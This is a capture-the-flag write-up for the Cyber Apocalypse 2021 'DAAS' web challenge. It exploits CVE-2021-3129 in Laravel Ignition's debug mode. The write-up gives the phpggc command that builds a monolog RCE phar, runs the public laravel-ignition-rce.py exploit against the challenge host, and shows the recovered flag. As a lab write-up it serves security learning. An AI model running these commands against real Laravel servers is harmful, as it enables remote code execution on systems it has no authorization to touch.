---
layout: load_md
title: The White Circle | Cyber Apocalypse 2021 | DAAS Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2021
parent: cyber_apocalypse_2021
category: web
challenge: DAAS
tags: "web, nigamelastic, laravel, rce"
date: 2021-04-24T00:00:00+00:00
last_update: 2021-04-24T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2021</h1>

## DAAS

> Solved by: Nigamelastic

* The hint for this challenge talks about being stuck in debug.
* Some research shows there is a CVE for this, and the Laravel version were working with is vulnerable.
* https://www.exploit-db.com/exploits/49424
* https://www.youtube.com/watch?v=gr8ZKQpYiug&

**CVE-2021-3129** : https://nvd.nist.gov/vuln/detail/CVE-2021-3129

* Find 

```
ip/_ignition/execute-solution
```

* For a laravel panel with error messages and stack trace. 

![](https://i.imgur.com/bwswVCZ.jpg)

* https://www.ambionics.io/blog/laravel-debug-rce
* As mentioned in the blog above i tried performing a post request but it gave me a 302 response
* but the above link mentions their github page and exploit which is
`https://github.com/ambionics/phpggc`
and 
`https://github.com/ambionics/laravel-exploits`

the idea is to get the phar file with ur custom command from 1st repo and then put the phar file into the exploit with specified url to run the exploit
**PS: for a linux command with spaces simply use** `"` 

* so for our case since we know the flag was found on the root directory and its name as 

```
flagM1AhS
```

* our phpggc command should be

```bash
php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat /flagM1AhS"
```

* run that in the exploit as:

```bash
./laravel-ignition-rce.py http://165.227.234.7:31636/ /tmp/exploit.phar
```

* and we have the flag:

```
CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
```

